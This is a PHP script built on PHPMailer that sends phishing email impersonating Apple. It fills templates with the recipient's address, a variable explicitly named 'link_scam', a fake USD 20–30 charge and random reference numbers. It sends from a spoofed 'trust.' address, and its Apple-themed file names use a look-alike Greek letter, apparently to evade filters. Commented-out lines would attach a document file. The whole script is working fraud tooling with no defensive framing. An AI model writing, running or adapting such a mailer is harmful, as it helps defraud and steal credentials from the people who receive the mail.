<?php
error_reporting(-1);
require_once(__DIR__ . '/vendor/autoload.php');

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;


if (isset($_REQUEST['send']))
{
  $smtp             = json_decode($_REQUEST['smtp']);
  $option           = json_decode($_REQUEST['option']);
  $pdfname          = 'Kebijakan_Αpple_'.strtolower($option->random_str).'.dot';

//   $mpdf             = new \Mpdf\Mpdf();

  $pdfMsg          = str_replace('##email##', $_REQUEST['to'], file_get_contents(__DIR__ . '/../source/letter.html'));
  $pdfMsg          = str_replace('##random_string##', $option->random_str, $pdfMsg);
  $pdfMsg          = str_replace('##random_number##', $option->nomer, $pdfMsg);
  $pdfMsg          = str_replace('##link##', $option->link_scam, $pdfMsg);
  $pdfMsg          = str_replace('##date##', date('Y/m/d'), $pdfMsg);
  $pdfMsg          = str_replace('##pdfName##', $pdfname, $pdfMsg);
  $pdfMsg          = str_replace('##amount##', 'USD' . rand(20, 30) . '.00', $pdfMsg);
  $pdfMsg          = str_replace('##link##', $option->link_scam, $pdfMsg);

  // $mpdf->WriteHTML($pdfMsg);
  // $mpdf->Output($pdfname, 'F');

  $mail             = new PHPMailer(true);
  $mail->CharSet    = 'UTF-8';
  $mail->SMTPDebug  = 0;
  $mail->isSMTP();
  $mail->Host       = $smtp->host;
  $mail->SMTPAuth   = true;
  $mail->Username   = $smtp->username;
  $mail->Password   = $smtp->password;
  $mail->SMTPSecure = 'tls';
  $mail->Port       = 587;

  $message          = str_replace('##email##', $_REQUEST['to'], file_get_contents($_REQUEST['letter']));
  $message          = str_replace('##random_string##', $option->random_str, $message);
  $message          = str_replace('##random_number##', $option->nomer, $message);
  $message          = str_replace('##link##', $option->link_scam, $message);
  $message          = str_replace('##date##', date('d/m/Y'), $message);
  $message          = str_replace('##pdfName##', $pdfname, $message);
  $message          = str_replace('##amount##', 'USD' . rand(20, 30) . '.00', $message);
  $message          = str_replace('##link##', $option->link_scam, $message);
  $message          = str_replace('##file_name##', 'Kebijakan_Αpple_'.strtolower($option->random_str).'.docx', $message);

  $subject          = str_replace('##email##', $_REQUEST['to'], $_REQUEST['subject']);
  $subject          = str_replace('##random_string##', $option->random_str, $subject);
  $subject          = str_replace('##random_number##', $option->nomer, $subject);
  $subject          = str_replace('##link##', $option->link_scam, $subject);
  $subject          = str_replace('##date##', date('d/m/Y'), $subject);
  $subject          = str_replace('##pdfName##', 'Kebijakan_Αpple_'.strtolower($option->random_str).'.docx', $subject);
  $subject          = str_replace('##amount##', 'USD ' . rand(20, 30) . '.00', $subject);

  $mail->setFrom('trust.' . $option->random_str . '@' . $option->random_str . '.com', $_REQUEST['from_name']);
  $mail->addAddress($_REQUEST['to']);
  // $mail->addAttachment('goblok.docx', 'Αpple_ID_'.$_REQUEST['to'].'.dot');
//   $mail->addAttachment('goblok.docx', $pdfname);

  $mail->isHTML(true);
  $mail->Subject    = $subject;
  $mail->Body       = $message;
  $mail->AltBody    = 'INVALID MESSAGE';
  $send             = $mail->send();
  @unlink(__DIR__ . '/' . $pdfname);
  if (!$send) { echo 'FAIL - ' . $mail->ErrorInfo; } else { echo 'OK'; }
}
